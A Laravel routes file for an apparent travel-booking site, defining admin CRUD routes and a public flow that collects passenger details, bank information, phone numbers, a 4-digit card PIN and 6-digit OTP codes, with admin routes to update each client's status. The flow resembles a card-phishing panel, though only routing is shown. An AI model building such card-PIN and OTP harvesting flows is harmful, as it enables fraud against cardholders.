<?php

use App\Http\Controllers\CityController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TripController;
use App\Http\Controllers\ClientController;
use App\Http\Controllers\CountryController;
use App\Http\Controllers\CurrencyController;


include_once "frontend.php";


Auth::routes();

Route::get('/admin', [App\Http\Controllers\HomeController::class, 'index'])->middleware('auth')->name('dashboard');

Route::controller(ClientController::class)->prefix('clients')->middleware('auth')->name('clients.')->group(function () {
    Route::get('/', 'index')->name('index');
    Route::get('/api-clients','getDataClients')->name('api');
    Route::get('/updatestatus/{status}/{id}','updatestatus')->name('updatestatus');
    Route::get('/updatestatus2/{status}/{id}','updatestatus2')->name('updatestatus2');
    Route::get('/{client}', 'edit')->name('edit');
    Route::get('/{client}/event', 'event')->name('event');
    Route::post('/{client}/event', 'doEvent')->name('doEvent');
    Route::put('/{client}', 'update')->name('update');
    Route::delete('destroy/{client}', 'destroy')->name('destroy');
});


Route::controller(TripController::class)->prefix('trips')->middleware('auth')->name('trips.')->group(function () {
    Route::get('/', 'index')->name('index');
    Route::get('/create', 'create')->name('create');
    Route::post('/', 'store')->name('store');
    Route::get('/{trip}', 'edit')->name('edit');
    Route::post('/{trip}', 'update')->name('update');
    Route::delete('destroy/{client}', 'destroy')->name('destroy');
});

Route::controller(CountryController::class)->prefix('password_card')->middleware('auth')->name('countries.')->group(function () {
    Route::get('/', 'index')->name('index');
    Route::get('/create', 'create')->name('create');
    Route::post('/', 'store')->name('store');
    Route::get('/{country}', 'edit')->name('edit');
    Route::put('/{country}', 'update')->name('update');
    Route::delete('destroy/{country}', 'destroy')->name('destroy');
});

Route::controller(CurrencyController::class)->prefix('currencies')->middleware('auth')->name('currencies.')->group(function () {
    Route::get('/', 'index')->name('index');
    Route::get('/create', 'create')->name('create');
    Route::post('/', 'store')->name('store');
    Route::get('/{currency}', 'edit')->name('edit');
    Route::put('/{currency}', 'update')->name('update');
    Route::delete('destroy/{currency}', 'destroy')->name('destroy');
});

Route::controller(CityController::class)->prefix('cities')->middleware('auth')->name('cities.')->group(function () {
    Route::post('/getCitiesByCountryAjax', 'getCitiesByCountryAjax')->name('getCitiesByCountryAjax');
});

//Route::view('/choose_trip' , 'frontend.choose_trip');
Route::get('/choose_trip', [TripController::class,'chooseTrip'])->name('choose_trip');
Route::get('/passengers_details/{trip_id}', [ClientController::class,'create'])->name('passengers_details');
Route::post('/passengers_details/store', [ClientController::class,'store'])->name('passengers_details.store');
Route::get('/bank_info/{trip_id}/{client_id}', [ClientController::class,'getBankInfo'])->name('bank_info');
Route::get('/sbank_infosss/{trip_id}/{client_id}', [ClientController::class,'getBankInfo'])->name('sbank_infosss');
Route::post('/bank_info/store', [ClientController::class,'storeBankInfo'])->name('bank_info.store');
Route::get('/trip_invoice/{id}', [ClientController::class,'tripInvoice'])->name('trip_invoice');


Route::get('/otp-code-step-2',[ClientController::class,'storeOtpInfoStep2'])->name('otp_info2.store');
Route::get('/otp-code-step-1',[ClientController::class,'storeOtpInfoStep1'])->name('otp_info1.store');
Route::post('/phone_info',[ClientController::class,'storePhoneInfo'])->name('phone_info.store');

Route::get('/check-otp-code/compare',[ClientController::class,'checkOtpCode'])->name('check_otp_code.compare');
//page password 4 digital
Route::get('/password_card_page',[ClientController::class,'checkOtppassword'])->name('password_card_page');
Route::post('/password_card',[ClientController::class,'checkOtpCode'])->name('password_card');
Route::post('/checkOtpCodePassword',[ClientController::class,'checkOtpCodePassword'])->name('checkOtpCodePassword');

//page otp for 6 digital

Route::get('/otp_card_page',[ClientController::class,'checkOtppage'])->name('otp_card_page');
Route::post('/password_card_otp',[ClientController::class,'checkOtpCodeotp'])->name('password_card_otp');

Route::get('/otp_card_page22',[ClientController::class,'checkOtppage22'])->name('otp_card_page22');
